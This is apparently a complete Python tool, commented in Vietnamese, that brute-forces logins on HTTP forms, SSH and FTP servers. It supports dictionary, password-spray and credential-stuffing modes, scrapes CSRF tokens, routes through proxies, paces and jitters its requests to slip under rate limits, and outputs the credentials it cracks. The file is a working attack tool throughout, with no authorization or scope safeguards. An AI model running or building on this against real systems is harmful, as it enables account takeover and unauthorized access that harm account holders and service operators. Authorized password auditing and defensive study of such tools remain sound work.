#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bruteforce Runner V1.1 (HTTP form / SSH / FTP) - Production-hardened

P0 bổ sung:
- Đọc JSON chịu BOM (utf-8-sig) + hỗ trợ stdin.
- HTTP session có retry/backoff (429, 5xx), verify SSL mặc định (có thể tắt theo profile), proxy/SOCKS5 per-target.
- pre_login TTL (cache CSRF/cookie theo thời hạn).
- Tiêu chí thành công HTTP linh hoạt hơn: status/location/set-cookie/body_regex + json_path (JSONPath đơn giản).
- Phân loại RATE_LIMIT/LOCKOUT và backoff mềm; STOP target khi LOCKOUT.
- Output gắn result_version="1.1"; giữ contract summary/findings/telemetry.
"""

import sys, os, json, time, random, re
import threading
from queue import Queue

import socket, ssl, ftplib, paramiko
import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# -------------------------- util chung --------------------------

def read_job():
    """Đọc job từ file (BF_JOB_FILE) hoặc stdin. Chấp nhận BOM."""
    fp = os.environ.get("BF_JOB_FILE")
    if fp and os.path.exists(fp):
        with open(fp, "r", encoding="utf-8-sig") as f:  # chấp nhận BOM
            return json.load(f)
    data = sys.stdin.buffer.read().decode("utf-8-sig")
    return json.loads(data)


def load_lines(path):
    if not path or not os.path.exists(path):
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [ln.strip() for ln in f if ln.strip()]


def load_pairs(path, sep=":"):
    pairs = []
    if not path or not os.path.exists(path):
        return pairs
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            ln = ln.strip()
            if not ln: 
                continue
            if sep in ln:
                u, p = ln.split(sep, 1)
                pairs.append((u.strip(), p.strip()))
    return pairs


def jitter_sleep(ms_range):
    if not ms_range or len(ms_range) != 2:
        return
    low, high = ms_range
    time.sleep(random.uniform(float(low), float(high)) / 1000.0)


def pace_sleep(rate_per_min):
    if not rate_per_min:
        return
    delay = 60.0 / float(rate_per_min)
    if delay > 0:
        time.sleep(delay)


def substitute(body_template, user, passwd, tokens=None):
    s = body_template.replace("§USER§", user).replace("§PASS§", passwd)
    if tokens:
        for k, v in tokens.items():
            s = s.replace(f"§{k.upper()}§", v)
    return s


# -------------------------- HTTP driver --------------------------

def _json_get(body_text, path):
    """
    JSONPath đơn giản: $.a.b.c (chỉ dot path, không array)
    """
    try:
        obj = json.loads(body_text)
    except Exception:
        return None
    parts = [p for p in path.strip().lstrip("$.").split(".") if p]
    cur = obj
    for p in parts:
        if isinstance(cur, dict) and p in cur:
            cur = cur[p]
        else:
            return None
    return cur


class HTTPFormDriver:
    def __init__(self, profile, limits):
        self.p = profile or {}           # dict dưới key "http" của target
        self.limits = limits or {}
        self.verify_ssl = bool(self.p.get("verify_ssl", True))
        self.proxy = self.p.get("proxy") # dict hoặc string; nếu dùng socks5, cần PySocks
        self.prelogin_ttl = int(self.p.get("pre_login_ttl_sec", 0))
        self._prelogin_ts = 0
        self.pre_tokens = {}
        self.pre_cookies = requests.cookies.RequestsCookieJar()
        self.prepared = False

    def _new_session(self):
        s = requests.Session()
        s.headers.update(self.p.get("headers", {}))

        retry = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=frozenset(['GET','POST','HEAD','OPTIONS'])
        )
        s.mount("http://", HTTPAdapter(max_retries=retry))
        s.mount("https://", HTTPAdapter(max_retries=retry))

        if self.proxy:
            s.proxies = self.proxy if isinstance(self.proxy, dict) else {"http": self.proxy, "https": self.proxy}
        return s

    def extract_tokens(self, html, rules):
        """rules: {name: "css_selector@attr"}"""
        out = {}
        if not rules:
            return out
        soup = BeautifulSoup(html, "lxml")
        for name, rule in rules.items():
            if "@" in rule:
                sel, attr = rule.split("@", 1)
            else:
                sel, attr = rule, "value"
            el = soup.select_one(sel)
            if el:
                out[name] = el.get(attr, "") if attr != "text" else (el.text or "").strip()
        return out

    def _pre_login_refresh(self):
        """Làm pre_login nếu chưa có hoặc TTL đã hết (mode=once)."""
        pre = self.p.get("pre_login")
        if not pre:
            self.prepared = True
            return
        if pre.get("mode", "once") != "once":
            return  # per_attempt sẽ xử lý tại do_attempt
        now = time.time()
        if self.prepared and self.prelogin_ttl and (now - self._prelogin_ts) < self.prelogin_ttl:
            return
        s = self._new_session()
        try:
            r = s.get(pre.get("url"), timeout=self.limits.get("timeout_sec", 15), verify=self.verify_ssl)
            self.pre_cookies.update(r.cookies)
            self.pre_tokens = self.extract_tokens(r.text, pre.get("extract", {}))
            self.prepared = True
            self._prelogin_ts = now
        except Exception:
            self.prepared = False

    def evaluate(self, resp, body_text):
        succ = self.p.get("success", {})
        fail = self.p.get("failure", {})
        mfa_rx = self.p.get("mfa_hint_regex")

        # RATE_LIMIT
        if resp is not None:
            if resp.status_code == 429 or resp.headers.get("Retry-After"):
                return "RATE_LIMIT"
            # LOCKOUT regex nếu có
            if fail:
                lock_rx = fail.get("lockout_regex")
                if lock_rx and re.search(lock_rx, body_text or "", re.I):
                    return "LOCKOUT"

        # SUCCESS any[]
        if succ:
            any_rules = succ.get("any", [])
            for rule in any_rules:
                ok = True
                if "status" in rule:
                    ok = ok and (resp is not None and resp.status_code == int(rule["status"]))
                if ok and "location_regex" in rule:
                    loc = ""
                    if resp is not None:
                        loc = resp.headers.get("Location", "")
                        if not loc and resp.history:
                            for h in resp.history[::-1]:
                                if h.headers.get("Location"):
                                    loc = h.headers.get("Location"); break
                    ok = bool(re.search(rule["location_regex"], loc or "", re.I))
                if ok and "set_cookie_regex" in rule:
                    sc = resp.headers.get("Set-Cookie", "") if resp is not None else ""
                    ok = bool(re.search(rule["set_cookie_regex"], sc or "", re.I))
                if ok and "body_regex" in rule:
                    ok = bool(re.search(rule["body_regex"], body_text or "", re.I))
                if ok and "json_path" in rule:
                    val = _json_get(body_text or "", rule["json_path"])
                    if "equals" in rule:
                        ok = (val == rule["equals"])
                    elif "regex" in rule and isinstance(val, str):
                        ok = bool(re.search(rule["regex"], val, re.I))
                if ok:
                    return "SUCCESS"

        # MFA
        if mfa_rx and re.search(mfa_rx, body_text or "", re.I):
            return "NEED_2FA"

        # FAILURE explicit
        if fail:
            body_rx = fail.get("body_regex")
            if body_rx and re.search(body_rx, body_text or "", re.I):
                return "FAIL"
            st = fail.get("status")
            if st is not None and resp is not None and resp.status_code == int(st):
                return "FAIL"

        # fallback
        if resp is not None and resp.status_code in (401, 403):
            return "FAIL"
        return "FAIL"

    def do_attempt(self, user, passwd):
        # refresh pre_login theo TTL nếu cần
        self._pre_login_refresh()

        sess = self._new_session()

        # per_attempt pre_login?
        tokens = {}
        pre = self.p.get("pre_login")
        if pre and pre.get("mode") == "per_attempt":
            try:
                r0 = sess.get(pre.get("url"), timeout=self.limits.get("timeout_sec", 15), verify=self.verify_ssl)
                tokens.update(self.extract_tokens(r0.text, pre.get("extract", {})))
            except Exception:
                pass
        else:
            # seed cookie/tokens từ pre_once (TTL)
            for c in self.pre_cookies:
                sess.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
            tokens.update(self.pre_tokens)

        url = self.p.get("url")
        method = (self.p.get("method") or "POST").upper()
        ctype = (self.p.get("content_type") or "form").lower()
        body_tmpl = self.p.get("body_template") or ""
        body_str = substitute(body_tmpl, user, passwd, tokens)

        data = None
        json_data = None
        headers = dict(self.p.get("headers", {}))

        if ctype == "json":
            headers["Content-Type"] = "application/json"
            try:
                json_data = json.loads(body_str)
            except Exception:
                json_data = None
                data = body_str.encode("utf-8")
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = body_str.encode("utf-8")

        try:
            resp = sess.request(
                method=method, url=url, headers=headers,
                data=data, json=json_data,
                allow_redirects=False,
                timeout=self.limits.get("timeout_sec", 15),
                verify=self.verify_ssl
            )
            body_text = ""
            if not resp.is_redirect:
                try:
                    body_text = resp.text
                except Exception:
                    body_text = ""
            return self.evaluate(resp, body_text), resp
        except requests.exceptions.RequestException:
            return "ERROR", None


# -------------------------- SSH driver --------------------------

class SSHDriver:
    def __init__(self, host, port, limits, auth="password"):
        self.host = host
        self.port = int(port or 22)
        self.limits = limits or {}
        self.auth = auth or "password"

    def do_attempt(self, user, passwd):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=self.host, port=self.port,
                username=user, password=passwd,
                allow_agent=False, look_for_keys=False,
                banner_timeout=self.limits.get("timeout_sec", 15),
                auth_timeout=self.limits.get("timeout_sec", 15),
                timeout=self.limits.get("timeout_sec", 15)
            )
            client.close()
            return "SUCCESS", None
        except paramiko.AuthenticationException:
            return "FAIL", None
        except paramiko.SSHException as e:
            msg = str(e).lower()
            if "too many authentication failures" in msg or "account locked" in msg:
                return "LOCKOUT", None
            return "ERROR", None
        except Exception:
            return "ERROR", None
        finally:
            try:
                client.close()
            except Exception:
                pass


# -------------------------- FTP driver --------------------------

class FTPDriver:
    def __init__(self, host, port, tls_mode, limits):
        self.host = host
        self.port = int(port or 21)
        self.tls_mode = tls_mode or "plain"   # plain | starttls | implicit
        self.limits = limits or {}

    def _connect(self):
        if self.tls_mode == "implicit":
            ftps = ftplib.FTP_TLS()
            ftps.connect(self.host, self.port, timeout=self.limits.get("timeout_sec", 15))
            ftps.prot_p()
            return ftps
        elif self.tls_mode == "starttls":
            ftps = ftplib.FTP_TLS()
            ftps.connect(self.host, self.port, timeout=self.limits.get("timeout_sec", 15))
            ftps.auth()  # AUTH TLS
            ftps.prot_p()
            return ftps
        else:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.limits.get("timeout_sec", 15))
            return ftp

    def do_attempt(self, user, passwd):
        try:
            cli = self._connect()
            resp = cli.login(user=user, passwd=passwd)
            ok = (resp and resp.startswith("230")) or (getattr(cli, "welcome", "") or "").startswith("230")
            try:
                cli.quit()
            except Exception:
                try: cli.close()
                except Exception: pass
            return "SUCCESS" if ok else "FAIL", None
        except ftplib.error_perm as e:
            if str(e).startswith("530"):
                return "FAIL", None
            return "ERROR", None
        except (socket.timeout, OSError, ssl.SSLError):
            return "ERROR", None
        except Exception:
            return "ERROR", None


# -------------------------- core runner --------------------------

def generate_attempts(strategy, users, passwords, pairs):
    out = []
    if strategy == "stuffing" and pairs:
        return list(pairs)
    if strategy == "spray":
        for p in passwords:
            for u in users:
                out.append((u, p))
        return out
    # dictionary
    for u in users:
        for p in passwords:
            out.append((u, p))
    return out


def run_target(target, users, passwords, pairs, limits, findings, counters, stop_flag):
    proto = target.get("protocol")
    rate_per_min = limits.get("rate_per_min")
    jitter = limits.get("jitter_ms")
    max_attempts = int(limits.get("max_attempts_per_target", 1000000))
    stop_on_success = bool(limits.get("stop_on_success", True))

    if proto == "http_form":
        http_profile = target.get("http", {})
        drv = HTTPFormDriver(http_profile, limits)
    elif proto == "ssh":
        drv = SSHDriver(target.get("host"), target.get("port", 22), limits, target.get("auth", "password"))
    elif proto == "ftp":
        drv = FTPDriver(target.get("host"), target.get("port", 21), target.get("tls", "plain"), limits)
    else:
        counters["errors"] += 1
        return

    strategy = job.get("strategy", "dictionary")
    attempts = generate_attempts(strategy, users, passwords, pairs)[:max_attempts]

    tested_here = 0
    for (user, passwd) in attempts:
        if stop_flag["stop"]:
            break

        jitter_sleep(jitter)
        pace_sleep(rate_per_min)

        status, _ = drv.do_attempt(user, passwd)
        tested_here += 1

        if status == "SUCCESS":
            findings.append({
                "host": target.get("host"),
                "port": target.get("port"),
                "protocol": proto,
                "username": user,
                "password": passwd
            })
            if stop_on_success:
                break
        elif status == "LOCKOUT":
            counters["lockout"] += 1
            break
        elif status == "RATE_LIMIT":
            counters["rate_limited"] += 1
            # backoff mềm dựa vào rate hiện tại
            time.sleep(min(10.0, 60.0 / max(1.0, float(limits.get("rate_per_min", 6)))))
        elif status == "NEED_2FA":
            counters["need_2fa"] += 1
            if stop_on_success:
                break
        elif status == "ERROR":
            counters["errors"] += 1
        # FAIL -> tiếp tục

    counters["tested"] += tested_here


# -------------------------- main --------------------------

if __name__ == "__main__":
    job = read_job()

    users = load_lines(job.get("wordlists", {}).get("users"))
    passwords = load_lines(job.get("wordlists", {}).get("passwords"))
    pairs = load_pairs(job.get("wordlists", {}).get("pairs"))

    limits = job.get("limits", {}) or {}
    concurrency = int(limits.get("concurrency", 1))
    targets = job.get("targets", [])

    q = Queue()
    for t in targets:
        q.put(t)

    findings = []
    counters = {"tested": 0, "errors": 0, "lockout": 0, "rate_limited": 0, "need_2fa": 0}
    stop_flag = {"stop": False}

    def worker():
        while not q.empty():
            try:
                tgt = q.get_nowait()
            except Exception:
                break
            try:
                run_target(tgt, users, passwords, pairs, limits, findings, counters, stop_flag)
            finally:
                q.task_done()

    threads = []
    for _ in range(max(1, concurrency)):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

    out = {
        "job_id": job.get("job_id"),
        "result_version": "1.1",
        "summary": {
            "tested": counters["tested"],
            "valid_found": len(findings),
            "errors": counters["errors"],
            "lockout": counters["lockout"],
            "rate_limited": counters["rate_limited"],
            "need_2fa": counters["need_2fa"]
        },
        "findings": findings,
        "telemetry": {
            "strategy": job.get("strategy"),
            "concurrency": limits.get("concurrency"),
            "rate_per_min": limits.get("rate_per_min"),
            "jitter_ms": limits.get("jitter_ms")
        }
    }
    print(json.dumps(out, ensure_ascii=False))
